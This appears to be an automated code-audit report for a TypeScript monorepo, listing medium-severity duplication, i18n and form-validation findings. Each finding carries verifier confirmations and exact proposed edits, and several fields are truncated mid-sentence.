**Note:** MikroORM does set `name` on its exceptions (node_modules/@mikro-orm/core/errors.js:10, `this.name = this.constructor.name`), so the WMS copy still catches the plain ORM path; the gap is only the wrapped/nested driver error the shared walker handles.
**Verifier:** The divergence is real and I confirmed every load-bearing claim by opening the files, but two of the finding's supporting claims are wrong and must not be carried into the fix.

CONFIRMED:
- packages/shared/src/lib/db/pg-errors.ts:41 is `isUniqueViolation(err, constraintName?, options)`. Its docblock at lines 22-26 and the `matchMessage` docblock at 29-38 are quoted accurately, word for word, including the "Twelve modules had each hand-rolled a different subset" and "the message is not authoritative … started answering 409 instead of 500" lines. packages/shared/AGENTS.md restates the rule: "Message matching is OPT-IN: keying off error text misclassifies unrelated failures that merely quote a constraint."
- The deprecation shim exists exactly as claimed: packages/core/src/modules/communication_channels/lib/pg-errors.ts:2 is `@deprecated Import isUniqueViolation from '@open-mercato/shared/lib/db/pg-errors' instead`.
- The canonical helper is dominant: 12 non-test source files under packages/core/src plus packages/webhooks and two internal shared consumers import `lib/db/pg-errors` (attachments/lib/quota-service.ts, auth/commands/users.ts, customer_accounts/api/admin/domain-mappings.t
**Fix notes:** No migration, no schema change, no frozen persisted identifier (the `device_already_registered` string is a response `code` in a JSON body, not an ACL feature / event id / notification type), no public package export removed. Safe, but do the two halves as separable edits — they have different justifications and different risk.

EDIT 1 — devices (the substantive half).
packages/core/src/modules/devices/commands/shared.ts: delete lines 108-119 (the `PG_UNIQUE_VIOLATION` const, the comment block, and `isDeviceUniqueViolation`) and drop the now-unused `import { UniqueConstraintViolationException } from '@mikro-orm/core'` at line 2 (check nothing else in that file uses it before deleting the import).
packages/core/src/modules/devices/commands/register.ts: replace the line-17 import with `import { isUniqueViolation } from '@open-mercato/shared/lib/db/pg-errors'` and change line 96 to `if (isU

## [MEDIUM] duplication — auth login re-implements the shared toErrorMessage walker the ui/core dedup commit centralised
**Lane:** dup-logic  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/auth/frontend/login.tsx:48
**Canonical:** packages/shared/src/lib/http/errorMessage.ts:13
**Why it matters:** This is the sixth copy of a walker the repo just consolidated precisely because copies drift silently — the last drift rendered a blank error. It sits on the login screen, the one surface where a swallowed or wrong error message leaves the user with no way to tell a bad password from a locked account or a server fault. Any future key added to the shared walker (or any fix to its ordering) will not reach login.
**Proposed fix:** Add `record.description` as a final fallback branch in packages/shared/src/lib/http/errorMessage.ts:29 (it is strictly additive — every existing caller returns null today where description is the only key), then delete extractErrorMessage from packages/core/src/modules/auth/frontend/login.tsx:48 and import { toErrorMessage } from '@open-mercato/shared/lib/http/errorMessage', updating its call sites.
**Note:** packages/core/src/modules/staff/lib/timesheets-ui/useActiveTimesheetTimer.ts:49 has a third, two-line variant reading only `result.error`; too small to report on its own but worth folding in with the same edit.
**Verifier:** I opened both files and every claim checks out verbatim, including the line numbers. packages/shared/src/lib/http/errorMessage.ts:13 is `export function toErrorMessage(payload: unknown): string | null` with exactly the null/string/array/object recursion and the error → message → detail → details key order, and its docblock at lines 9-11 does say copies had drifted so `{ details: '…' }` rendered blank. packages/core/src/modules/auth/frontend/login.tsx:48 is `function extractErrorMessage(payload: unknown): string | null` with the identical null/string/array branches and a `candidates` array of `[record.error, record.message, record.detail, record.details, record.description]` — same recursion, same order, one extra trailing key. Commit 5643e661 exists ("refactor(ui): share API error extraction and locale persistence") and did collapse the copies in MessageConfirmationContent, message-detail/utils, messages view/[token]/page.tsx and useMessageCompose.

Adversarial checks that failed to refute it: (1) Neither file is a test, __tests__, *.generated.*, dist/, .ai/, graft/ or node_modules — login.tsx is the real admin sign-in page, mounted by packages/core/src/modules/auth/__tests__/login
**Fix notes:** Exact edits:
1. packages/shared/src/lib/http/errorMessage.ts:29 — append one fallback after the `details` branch: `?? toErrorMessage(record.description)`. Extend the docblock's key list at line 5 (`error`, `message`, `detail`, `details`) to mention `description` so the comment does not go stale.
2. packages/core/src/modules/auth/frontend/login.tsx — delete lines 48-72 (`function extractErrorMessage`), add `import { toErrorMessage } from '@open-mercato/shared/lib/http/errorMessage'` next to the existing `readJsonSafe` import at line 17, and change line 298 to `errorMessage = toErrorMessage(data) || ''`. core → shared imports are already established in this exact file, so no new package dependency.
3. Optional, per the finding's note: replace `getErrorMessage` at packages/core/src/modules/staff/lib/timesheets-ui/useActiveTimesheetTimer.ts:49 with `toErrorMessage(result) ?? fallback`. This 

## [MEDIUM] duplication — `/backend/auth/profile` and `/backend/profile/change-password` are two live routes rendering the same password-change form from ~180 duplicated lines
**Lane:** dup-surface  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/auth/backend/auth/profile/page.tsx:36
**Canonical:** packages/core/src/modules/auth/backend/profile/change-password/page.tsx:35
**Why it matters:** This is the credential-change surface. A fix to the password validation, the `currentPassword` requirement, or the 'no changes to save' guard applied to one file leaves the other route serving the old logic, and users reach both — the profile menu goes to change-password, while auth security notifications link to auth/profile. The auth/profile copy also carries a second stale detail: its heading reads `t('auth.profile.title', 'Profile')` over a form whose only purpose is changing a password.
**Proposed fix:** Extract the loader/schema/fields/handleSubmit body into one shared client component under `packages/core/src/modules/auth/components/`, and reduce both page.tsx files to that component plus their own wrapper (Page/PageBody vs bare section) and heading key. Alternatively, since `auth/backend/profile/page.tsx:9` already does `router.replace('/backend/profile/change-password')`, make `auth/backend/auth/profile/page.tsx` the same one-line redirect and repoint the three `linkHref` values in auth/notifications.ts.
**Note:** Both meta files set `navHidden: true`, so neither appears in the sidebar — the duplication is only visible through the direct links above.
**Verifier:** Survives. I opened both files and confirmed the duplication directly. `diff` of the two files with all whitespace stripped produces 7 hunks, every one of them cosmetic or wrapper-level: `"use client"` vs `'use client'`; the extra `import { Page, PageBody }`; `component: 'profile-page'` vs `'change-password-page'`; the component name; `max-w-2xl` on the section; the `h2` key (`auth.profile.title` vs `auth.changePassword.title`); and early-return loading/error vs a ternary inside `<Page><PageBody>`. Everything from the `ProfileResponse`/`ProfileUpdateResponse`/`ProfileFormValues` types (L18-L34 / L19-L35) through `handleSubmit` (ending L172 / L173) is byte-identical — the `apiCall('/api/auth/profile')` loader, the four `CrudField`s, the `buildPasswordSchema` + `superRefine` block with all four issues, and the `noChanges` guard plus `readApiResultOrThrow('/api/auth/profile', { method: 'PUT' })`.

graft confirms the exact spans and that neither default export has any indexed caller: `AuthProfilePage · packages/core/src/modules/auth/backend/auth/profile/page.tsx:L36-L217` and `ProfileChangePasswordPage · packages/core/src/modules/auth/backend/profile/change-password/page.tsx:L35-L214`. 
**Fix notes:** EXACT EDITS (recommended path — behaviour-preserving):

1. Create `packages/core/src/modules/auth/components/ProfileCredentialsForm.tsx`, `'use client'`. Move verbatim from `profile/change-password/page.tsx`: the three types (L18-L33), the whole component body L36-L172 (state, `passwordPolicy`/`passwordRequirements`/`passwordDescription` memos, the loader effect, `fields`, `schema`, `handleSubmit`), the loading/error early returns, and the `<section>…<CrudForm>` JSX L182-L213. Give it two props: `headingKey`/`headingFallback` (or a `heading: React.ReactNode`) and `className` for the section (so change-password keeps `max-w-2xl` and auth/profile does not). Keep `createLogger('auth').child({ component: 'profile-credentials-form' })` inside it.

2. `packages/core/src/modules/auth/backend/profile/change-password/page.tsx` becomes `'use client'` + default export rendering `<ProfileCredentials

## [MEDIUM] duplication — sales forks `MessageObjectDetail`/`MessageObjectPreview` into `SalesDocument*` copies, while its own registry file imports the shared originals for a third entry
**Lane:** dup-surface  **Fix is safe:** False
**Divergent sites:**
- packages/core/src/modules/sales/widgets/messages/SalesDocumentMessageDetail.tsx:14
- packages/core/src/modules/sales/widgets/messages/SalesDocumentMessagePreview.tsx:8
- packages/core/src/modules/sales/message-objects.ts:18
**Canonical:** packages/ui/src/backend/messages/MessageObjectDetail.tsx:14
**Why it matters:** Because the fork drops `icon={props.icon}` (line 31 of the canonical), sales order and quote message cards ignore the `icon` the registry declares, and because SalesDocumentMessagePreview omits the shared component's `previewData.metadata` `<dl>` block (MessageObjectPreview.tsx:40-49), any metadata `loadSalesOrderPreview`/`loadSalesQuotePreview` returns is silently dropped. Sales message objects render with less information than every other module's, in the same list.
**Proposed fix:** Delete `packages/core/src/modules/sales/widgets/messages/SalesDocumentMessageDetail.tsx`, `SalesDocumentMessagePreview.tsx` and `widgets/messages/index.ts`, and change `PreviewComponent`/`DetailComponent` on the order (:18-19) and quote (:48-49) entries in sales/message-objects.ts to the already-imported `MessageObjectPreview`/`MessageObjectDetail` — the `icon: 'receipt-text'` / `icon: 'file-text'` fields already present on those entries reproduce the hardcoded icons through the lucide registry.
**Verifier:** Verified at HEAD ffd7404f, clean tree. All four cited sites exist at the exact lines claimed: SalesDocumentMessageDetail.tsx:14 (`export function SalesDocumentMessageDetail(props: ObjectDetailProps)`), SalesDocumentMessagePreview.tsx:8 (`export function SalesDocumentMessagePreview({`), sales/message-objects.ts:18 (`PreviewComponent: SalesDocumentMessagePreview,`), canonical MessageObjectDetail.tsx:14. I re-ran the whitespace-normalised diff of the two detail files myself: 5 hunks, all of them the renamed symbol/import/JSX tag/default export EXCEPT one semantic delta — `icon={props.icon}` present at MessageObjectDetail.tsx:31, absent from the fork. That is a verbatim 95-line fork.

Not a test/generated/dist/.ai path (dist copies exist but are build output, source cited is under src/). Not already fixed.

The dominance check holds for the plain case: customers:2, currencies:2, catalog:2, resources:2, staff:2 and apps/mercato/src/modules/example/message-objects.ts:2 all import the shared pair, and sales itself imports it at :2 and uses it for the `channel` entry at :78-79.

CORROBORATION the reporter missed: .ai/specs/implemented/SPEC-049-2026-02-26-message-objects-universal-view-atta
**Fix notes:** Not a migration, not a frozen persisted identifier (no ACL feature id, event id, notification type or schema touched), not a public contract (symbols are unexported outside the module). But the fix AS WRITTEN is not behavior-neutral, on one axis the reporter did not check.

WHAT IS SAFE
- Icon parity: exact. `icon: 'receipt-text'` (message-objects.ts:17) → ReceiptText and `icon: 'file-text'` (:47) → FileText via lucideRegistry.generated.tsx:279/:225, identical to the fork's hardcoded imports. Every render site already passes `icon={objectType?.icon}`.
- Metadata: gaining the <dl> is the point of the fix.
- Subtitle: the fork always renders the <p> even when empty (SalesDocumentMessagePreview.tsx:36); the shared one renders it conditionally (MessageObjectPreview.tsx:34-36). Cosmetic gain, no loss.

THE REGRESSION THE FIX MUST HANDLE
SalesDocumentMessagePreview.tsx:18-22 supplies a title f

## [MEDIUM] duplication — `apps/mercato/src/components/ui/{card,input,label}.tsx` are stale pre-design-system forks of the UI primitives, next to `button`/`checkbox` which are one-line re-export shims
**Lane:** dup-surface  **Fix is safe:** True
**Divergent sites:**
- apps/mercato/src/components/ui/card.tsx:10
- apps/mercato/src/components/ui/input.tsx:11
- apps/mercato/src/components/ui/label.tsx:1
**Canonical:** apps/mercato/src/components/ui/button.tsx:1
**Why it matters:** AGENTS.md forbids code under `apps/mercato/src/` outside `*.generated.ts` registries, and the DS rules forbid `dark:` overrides on semantic tokens and painting surfaces with the wrong token. Any app-level page that reaches for `@/components/ui/input` — the natural import given `@/components/ui/button` is already used at StartPageContent.tsx:4 and GlobalNoticeBars.tsx:6 — silently gets a transparent-background field with a `dark:bg-input/30` override and a hardcoded focus ring instead of the DS input, and `@/components/ui/card` renders `bg-card` where the rest of the app renders `bg-surface`. The divergence typechecks and passes lint, so nothing catches it.
**Proposed fix:** Replace all three bodies with the one-line re-export already used by their two neighbours: `export { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter, CardAction } from '@open-mercato/ui/primitives/card'`, `export { Input, type InputProps, inputWrapperVariants, inputElementVariants } from '@open-mercato/ui/primitives/input'`, `export { Label } from '@open-mercato/ui/primitives/label'`.
**Note:** Only `button` currently has real importers (`@/components/ui/button` at StartPageContent.tsx:4 and GlobalNoticeBars.tsx:6) plus a jest mock of `checkbox`; card/input/label have no importers today, so the shim swap is behaviour-neutral and the harm is the trap left for the next app-level page.
**Verifier:** SURVIVES — I opened all five app files and all three canonical primitives, and every cited line is exactly as quoted.

Verified as-cited (no line drift):
- `apps/mercato/src/components/ui/button.tsx:1` and `checkbox.tsx:1` are one-line re-exports, verbatim as quoted.
- `card.tsx:10` = `"bg-card text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm"`; `packages/ui/src/primitives/card.tsx:10` = `"bg-surface ... border border-border ..."`. Otherwise the two files are byte-identical apart from the quote style on the `cn` import (line 3). Same 7 exports on both sides.
- `input.tsx` is 21 lines vs the canonical 87. Line 11 carries `selection:bg-primary ... dark:bg-input/30 border-input flex h-9 ... bg-transparent ...` and line 12 `focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-2`, exactly as quoted. Canonical `primitives/input.tsx:10` uses `bg-input-bg`, `focus-within:shadow-focus`, `border-input-border-focus`, and exposes `leftIcon`/`rightIcon`/`size`/`inputClassName` the fork lacks.
- `label.tsx:1` is `"use client"`; the file differs from `packages/ui/src/primitives/label.tsx` only in quote style and `export {}` vs `export function`. Class s
**Fix notes:** No DB migration, no frozen persisted identifier (no ACL feature id / event id / notification type / schema), no public contract — `apps/mercato` publishes nothing and `@/*` is app-internal.

Exact edits, each file's entire contents replaced by one line:

apps/mercato/src/components/ui/card.tsx
  export { Card, CardHeader, CardFooter, CardTitle, CardAction, CardDescription, CardContent } from '@open-mercato/ui/primitives/card'
  (I checked both export blocks — identical 7 names on both sides. Verified rendering-neutral: --card === --surface in both themes, and the `@layer base * { @apply border-border }` rule at globals.css:754 already gives the fork's bare `border` the same color as the canonical's `border-border`.)

apps/mercato/src/components/ui/label.tsx
  export { Label } from '@open-mercato/ui/primitives/label'
  (Canonical exports only `Label`; class string is character-identical. 

## [MEDIUM] consistency — business_rules client rule-form zod schema hardcodes English validation messages; it is the only client form schema in packages/core that does
**Lane:** forms-validation  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/business_rules/components/formConfig.tsx:47
- packages/core/src/modules/business_rules/components/formConfig.tsx:48
- packages/core/src/modules/business_rules/components/formConfig.tsx:49
- packages/core/src/modules/business_rules/components/formConfig.tsx:51
- packages/core/src/modules/business_rules/components/formConfig.tsx:52
- packages/core/src/modules/business_rules/components/formConfig.tsx:53
**Canonical:** packages/core/src/modules/customers/components/formConfig.tsx:763
**Why it matters:** CrudForm looks the literal up as a translation key and falls back to itself, so a non-English admin editing a business rule sees a fully translated form whose validation errors read "Rule ID must be 50 characters or less" in English. Because this module's API returns `{ error: 'Validation failed: ...' }` with no `fieldErrors`, the client schema is the ONLY source of per-field feedback on this form — so every field-level message the user can ever see here is untranslated.
**Proposed fix:** Replace each literal with the module's existing i18n key namespace, exactly as `sets/create/page.tsx:14` already does — e.g. `'business_rules.rules.form.validation.ruleIdRequired'` — either as a key literal (customers style, no signature change) or by taking `t` as a parameter. Add the keys to the module's locale files.
**Verifier:** SURVIVES on substance, but the finding's headline uniqueness claim is FALSE and it under-counts the defect.

VERIFIED (I opened every file):
1. All six cited line numbers are exact — `packages/core/src/modules/business_rules/components/formConfig.tsx:47,48,49,51,52,53` contain the quoted hardcoded English zod messages verbatim. Not a test, not generated, not dist/.ai/graft. Working tree is clean at ffd7404f, so not already fixed.
2. The schema is LIVE, not dead code: `businessRuleFormSchema` is imported and passed as CrudForm's `schema` prop at `backend/rules/create/page.tsx:11,75` and `backend/rules/[id]/page.tsx:19,161`.
3. The CrudForm mechanism is real. `translateValidationMessage` at `packages/ui/src/backend/CrudForm.tsx:1242-1250` is literally `return t(trimmed, trimmed)`. Client zod issue messages are piped through it on the submit path (`safeParse` at :2938 → `res.error.issues.forEach` :2941 → `setErrors(translateValidationErrors(...))` at :2949) and on the per-field blur path (:2033 → :2048). So a literal English message is looked up as a translation key, misses, and falls back to itself — English for every locale.
4. The consequence is real. `api/rules/route.ts:254,273,33
**Fix notes:** SAFE. No DB migration, no frozen persisted identifier (no ACL feature id, event id, notification type, or schema column changes), no public contract change — `businessRuleFormSchema` is not re-exported from the module index or any packages/core entry point. The only behaviour change is the rendered text of client-side validation errors, which is precisely the defect.

RECOMMENDED EDIT (key-literal / customers style — no signature change, so neither page needs touching):

In packages/core/src/modules/business_rules/components/formConfig.tsx replace each literal with a key string, e.g. line 47:
  ruleId: z.string()
    .min(1, 'business_rules.rules.form.validation.ruleIdRequired')
    .max(50, 'business_rules.rules.form.validation.ruleIdMaxLength'),
...and the same for ruleName (:48), description (:49), ruleCategory (:51), entityType (:52), eventType (:53).

DO NOT FORGET line 63 (the mess

## [MEDIUM] consistency — WMS warehouse client form schema omits the server's isPrimary/isActive cross-field rule that the inventory-profile schema 17 lines below does mirror
**Lane:** forms-validation  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/wms/components/backend/WmsConfigurationPage.tsx:134
**Canonical:** packages/core/src/modules/wms/components/backend/WmsConfigurationPage.tsx:151
**Why it matters:** An operator who unchecks "Active" while "Primary warehouse" is checked passes client validation, round-trips to the server, and gets the rejection back as the untranslated literal 'Inactive warehouses cannot be marked as primary.' surfaced by raiseCrudError (WmsConfigurationPage.tsx:405) — English in every locale, and only after a network round-trip, while the sibling FEFO rule on the same page fails instantly with a translated inline field error.
**Proposed fix:** Convert `warehouseFormSchema` into a `buildWarehouseFormSchema(primaryRequiresActiveMsg: string)` factory in the shape of `buildInventoryProfileFormSchema` (line 151) and append `.superRefine((payload, ctx) => { if (payload.isPrimary && !payload.isActive) ctx.addIssue({ code: z.ZodIssueCode.custom, path: ['isPrimary'], message: primaryRequiresActiveMsg }) })`, passing a `t('wms.backend.config.warehouses.errors.primaryRequiresActive', ...)` message from the component.
**Verifier:** I opened every cited file and the finding holds.

SERVER RULE — CONFIRMED. `packages/core/src/modules/wms/data/validators.ts:33-42` defines `enforcePrimaryRequiresActiveWarehouse` with the exact literal `'Inactive warehouses cannot be marked as primary.'` on `path: ['isPrimary']`. It is attached at `:59` (`warehouseCreateSchema`) and `:64` (`warehouseUpdateSchema`), and both are applied on the live HTTP path at `packages/core/src/modules/wms/api/warehouses/route.ts:114` and `:124` via `parseScopedCommandInput`.

DIVERGENT CLIENT SCHEMA — CONFIRMED. `WmsConfigurationPage.tsx:134-142` is a bare `z.object({...})` ending at `isPrimary: z.boolean().default(false)` with no `.superRefine`. It is consumed at `:541` (`schema={warehouseFormSchema}`) by the `CrudForm` in `WarehouseSection` (`:276`). Both inputs are freely user-editable checkboxes at `:323` and `:324`, in create and edit mode alike (`initialValues` at `:363-374`), and the submit body at `:398-403` spreads the full `values` object, so `{ isPrimary: true, isActive: false }` reaches the server verbatim.

CANONICAL — CONFIRMED AND DOMINANT. `buildInventoryProfileFormSchema` at `:151-170` mirrors `enforceFefoWhenExpirationTracked` 
**Fix notes:** EXACT EDITS — both in `packages/core/src/modules/wms/components/backend/WmsConfigurationPage.tsx`.

1) Replace the const at :134-142 with a factory in the shape of `buildInventoryProfileFormSchema` (:151):

    function buildWarehouseFormSchema(primaryRequiresActiveMsg: string) {
      return z.object({
        name: z.string().trim().min(1),
        code: z.string().trim().min(1),
        city: z.string().trim().optional(),
        country: z.string().trim().optional(),
        timezone: z.string().trim().optional(),
        isActive: z.boolean().default(true),
        isPrimary: z.boolean().default(false),
      }).superRefine((payload, ctx) => {
        if (payload.isPrimary && !payload.isActive) {
          ctx.addIssue({
            code: z.ZodIssueCode.custom,
            path: ['isPrimary'],
            message: primaryRequiresActiveMsg,
          })
        }
      })
    }

2) I

## [MEDIUM] duplication — business_rules rule-set form schema is duplicated across its create and edit pages — the only create/edit page pair in packages/core that does not share one schema
**Lane:** forms-validation  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/business_rules/backend/sets/create/page.tsx:12
- packages/core/src/modules/business_rules/backend/sets/[id]/page.tsx:25
**Canonical:** packages/core/src/modules/business_rules/components/formConfig.tsx:45
**Why it matters:** The two copies have already drifted: the create form reports an empty required field with a translated message and the edit form falls through to whatever CrudForm resolves for the raw literal. Any future constraint change (a longer setId, a new field, a cross-field rule) will be applied to one page and silently missed on the other, letting the edit path accept payloads the create path rejects.
**Proposed fix:** Move the schema into `packages/core/src/modules/business_rules/components/formConfig.tsx` next to `businessRuleFormSchema` as `createRuleSetFormSchema(t)`, then import it from both `sets/create/page.tsx` and `sets/[id]/page.tsx` and delete the two local declarations. The field/group definitions on both pages are already near-identical and can follow in the same move.
**Verifier:** VERIFIED at HEAD ffd7404f (working tree clean). Both cited sites are exact, not drifted: `packages/core/src/modules/business_rules/backend/sets/create/page.tsx:12-18` holds `createRuleSetFormSchema = (t) => z.object({...})` (graft confirms the symbol span L12-L18), and `packages/core/src/modules/business_rules/backend/sets/[id]/page.tsx:25-30` holds the untranslated `ruleSetFormSchema = z.object({...})`. Field constraints are identical (setId min1/max50, setName min1/max200, description max5000 nullable, enabled optional); only the messages differ. The canonical is exact too: `components/formConfig.tsx:45 export const businessRuleFormSchema`, imported at `backend/rules/create/page.tsx:11` and used at `:75`, imported at `backend/rules/[id]/page.tsx:19` and used at `:161` — the sibling pair in the same module.

DOMINANCE CHECK PASSES. I enumerated every directory under packages/core/src/modules/*/backend containing BOTH `create/page.tsx` and `[id]/page.tsx`: exactly 26 pairs, matching the finding's count. Counting local `z.object(` in each: business_rules/sets is the ONLY pair where both files declare their own — every other pair scores 0/0 (they either import a shared factory or pas
**Fix notes:** Safe: client-side form validation only. No DB migration, no schema change, no frozen persisted identifier (no ACL feature id, event id, or notification type touched), no public contract (both consts are file-local and unexported). Because the constraints on the two copies are already identical, consolidation changes zero validation behaviour; and because CrudForm's `required` check preempts `.min(1)` on both pages (see reason), giving the edit page the translated messages changes nothing a user can observe either.

EXACT EDITS:
1. In packages/core/src/modules/business_rules/components/formConfig.tsx (already `"use client"` at line 1, already imports `z` at line 4), add next to `businessRuleFormSchema` (:45):
   export const createRuleSetFormSchema = (t: (key: string) => string) =>
     z.object({
       setId: z.string().min(1, t('business_rules.sets.form.validation.setIdRequired')).max(

## [MEDIUM] consistency — AclEditor renders seven hardcoded English strings interleaved with t() calls in the same JSX block
**Lane:** i18n  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/auth/components/AclEditor.tsx:538
- packages/core/src/modules/auth/components/AclEditor.tsx:367
- packages/core/src/modules/auth/components/AclEditor.tsx:370
- packages/core/src/modules/auth/components/AclEditor.tsx:376
- packages/core/src/modules/auth/components/AclEditor.tsx:377
- packages/core/src/modules/auth/components/AclEditor.tsx:384
- packages/core/src/modules/auth/components/AclEditor.tsx:308
**Canonical:** packages/core/src/modules/auth/components/AclEditor.tsx:536
**Why it matters:** AclEditor is mounted on the Edit Role (auth/backend/roles/[id]/edit/page.tsx:177) and Edit User (auth/backend/users/[id]/edit/page.tsx:436) screens. A non-English admin sees a half-translated permissions editor, and the untranslated half is the security-critical copy — the super-admin toggle and the global-wildcard warning explaining that a grant opens every feature in the system.
**Proposed fix:** Add auth.acl.superAdminLabel, .superAdminRestricted, .globalWildcardTitle, .globalWildcardHint, .removeGlobalWildcard, .organizationsHint and .loading to packages/core/src/modules/auth/i18n/en.json (plus the 7 other locale files so check-sync stays green) and wrap the seven literals in the t() already in scope.
**Note:** Lines 370 and 377 are already reported by `yarn i18n:check-hardcoded`; 308, 367, 376, 384 and 538 slip past its heuristics but are the same defect in the same component.
**Verifier:** Every claim verified by opening the file. All 7 cited line numbers are byte-exact with zero drift: 308 `Loading ACL…`, 367 `Super Admin (all features)`, 370 `Only super administrators can change this option.`, 376 `Global wildcard (*) enabled`, 377 `This grants access to all features in the system.`, 384 `Remove global wildcard`, 538 `Empty = all organizations. Select one or more to restrict.` The canonical `t('auth.acl.organizationsScope', 'Organizations scope')` sits at line 536, two lines above the hardcoded 538, in the same <div> — the interleaving is real. `useT` is imported at line 7 and called at line 128; the `t(key, fallback)` two-arg form is proven by 5 existing calls at 466, 519, 536, 557, 561. The `auth.acl.*` namespace exists in packages/core/src/modules/auth/i18n/en.json with 12 keys.

I actively tried to refute and failed on every axis: (1) not a test/__tests__/generated/dist/.ai path — it is a live client component; (2) not already fixed — `git status` on packages/core/src/modules/auth/ is clean; (3) not a documented deliberate exception — there is NO `packages/core/src/modules/auth/i18n/.hardcoded-allowlist.json`; the only allowlist in the repo is `packages/core/sr
**Fix notes:** EXACT EDITS — wrap each literal in the `t` already in scope (declared at line 128), using the existing two-arg `t(key, englishFallback)` form so rendered English is byte-identical and behaviour cannot drift:

AclEditor.tsx:
- 308 → `{t('auth.acl.loading', 'Loading ACL…')}` (keep the ellipsis character U+2026, not three dots)
- 317 → `{t('auth.acl.inheritedTitle', 'Permissions inherited from roles')}`
- 320 → `{t('auth.acl.inheritedHint', 'This user currently inherits permissions from their assigned roles.')}`
- 323 → `{' '}{t('auth.acl.assignedRoles', 'Assigned roles:')}{' '}` (preserve both `{' '}` spacers — they are load-bearing for the inline role-link list that follows)
- 351 → `{t('auth.acl.overrideLabel', 'Override permissions for this user only')}`
- 367 → `{t('auth.acl.superAdminLabel', 'Super Admin (all features)')}`
- 370 → `{t('auth.acl.superAdminRestricted', 'Only super admin

## [MEDIUM] consistency — Feature toggle create page hardcodes its CrudForm title although it already holds a translator and the edit page translates the same title
**Lane:** i18n  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/feature_toggles/backend/feature-toggles/global/create/page.tsx:29
**Canonical:** packages/core/src/modules/feature_toggles/backend/feature-toggles/global/[id]/edit/page.tsx:77
**Why it matters:** The Create Feature Toggle page header stays English in every locale while every field label and group heading around it is translated — a visibly half-localized form on a superadmin surface. The fix is one line because the translator is already in scope.
**Proposed fix:** Add "feature_toggles.form.title.create": "Create Feature Toggle" to the 8 i18n/*.json files and change line 29 to title={t('feature_toggles.form.title.create', 'Create Feature Toggle')}.
**Note:** Reported by `yarn i18n:check-hardcoded` as [jsx-attr] but that output is advisory and 802 entries long; this one is confirmed user-facing with the canonical twin in the sibling route.
**Verifier:** Verified against the live files, not the report. (1) packages/core/src/modules/feature_toggles/backend/feature-toggles/global/create/page.tsx line 29 is literally `title="Create Feature Toggle"`, and lines 11/22/23 do hold `const t = useT()` and pass it into `createFieldDefinitions(t)` / `createFormGroups(t)` — the translator is already in scope, exactly as claimed. (2) The canonical twin is real: [id]/edit/page.tsx:77 is `title={t('feature_toggles.form.title.edit', 'Edit Feature Toggle')}`, with 86/87 also translated. (3) i18n/en.json:35 defines `feature_toggles.form.title.edit` and no `.create` counterpart; all 8 locales carry the `.edit` key at line 35 and none carry `.create`. (4) Not test/generated/dist — it is a live backend route page mounted by the generated registries. (5) The string is genuinely rendered untranslated: CrudForm passes `title` straight through to `FormHeader` (CrudForm.tsx:3725 and :3807 both `title={title}`) with no internal `t()` wrap — unlike group titles, which CrudForm does wrap (`title={t(g.title, g.title)}` at :3582/:3629/:3683). So in a non-English locale the header stays English while every field label and group heading around it translates. (6) Th
**Fix notes:** Exact edits.

1. packages/core/src/modules/feature_toggles/backend/feature-toggles/global/create/page.tsx:29
   -          title="Create Feature Toggle"
   +          title={t('feature_toggles.form.title.create', 'Create Feature Toggle')}
   No import needed — `useT` is already imported (line 6) and `t` bound (line 11).

2. Insert `"feature_toggles.form.title.create"` immediately BEFORE the existing `"feature_toggles.form.title.edit"` at line 35 of each of the 8 dictionaries (alphabetical order is enforced by i18n:check-sync; `.create` sorts before `.edit`). The English value MUST stay exactly `Create Feature Toggle` or TC-ADMIN-005.spec.ts:35 breaks. Mirror the per-locale state of the sibling `.edit` key: de/es/ko/pl carry real translations there, while fr/vi/zh currently hold the untranslated English `"Edit Feature Toggle"` — so English placeholders in fr/vi/zh match the existing (alre

## [MEDIUM] broken-flow — Workflows visual editor ships an enabled, fully translated "Run Test" button whose handler only flashes a hardcoded English placeholder
**Lane:** open-loops  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/workflows/backend/definitions/visual-editor/page.tsx:533
- packages/core/src/modules/workflows/backend/definitions/visual-editor/page.tsx:800
- packages/core/src/modules/workflows/components/mobile/MobileVisualEditor.tsx:174
**Canonical:** packages/core/src/modules/workflows/backend/definitions/visual-editor/page.tsx:505
**Why it matters:** A user on the workflow visual editor sees a primary-looking, enabled, translated "Run Test" / "Test ausführen" button next to Save and Validate. Clicking it validates and then shows an English-only info toast that no dictionary covers, so a German user gets untranslated developer copy. The affordance promises test execution and delivers nothing, on both desktop and mobile. The API it would need already exists (`POST /api/workflows/instances`, packages/core/src/modules/workflows/api/instances/route.ts), so the button is orphaned rather than dead — it should either be wired up or removed.
**Proposed fix:** Smallest safe edit: hide the affordance until the handler exists — gate the desktop button (page.tsx:796-805) and the mobile menu item (MobileVisualEditor.tsx:174) off, or render them `disabled` with the existing `common.comingSoon` treatment the catalog module uses (packages/core/src/modules/catalog/components/products/ProductsDataTable.tsx:334). If the button stays, at minimum route the message through `t()` with a `workflows.visualEditor.testNotImplemented` key, or prefix it `[internal]` per the i18n rule — a raw English `flash(...)` string is neither.
**Note:** .ai/specs/2026-07-22-visual-editor-user-task-config-persistence.md:150 mentions this handler but explicitly excludes the work: "test execution remains the existing TODO and this capability does not add serialization or execution behavior." So no open spec schedules the fix — the spec only confirms the loop is knowingly open.
**Verifier:** SURVIVES on its core broken-flow claim, but two sub-claims are WRONG and must be dropped before anyone acts on it.

CONFIRMED (I opened every file):
- page.tsx:523-534 — `const handleTest = useCallback(() => {` validates, then falls through to `// TODO: Implement test logic (create instance, run first step)` + `flash('Test functionality will be implemented next', 'info')` at :533. Verbatim as quoted.
- page.tsx:796-806 — `{!isCodeOnly && (<Button variant="outline" size="sm" onClick={handleTest} disabled={isSaving} ...>` with `{t('workflows.visualEditor.runTest')}`. `onClick={handleTest}` is exactly :800.
- MobileVisualEditor.tsx:174 — `onClick={() => { onTest(); setShowMoreActions(false) }}` exactly, label `t('workflows.mobile.runTest', 'Run Test')` at :179.
- The finding MISSED a third site: page.tsx:723 `onTest={handleTest}` is what wires mobile to the same placeholder. Both surfaces share one dead handler.
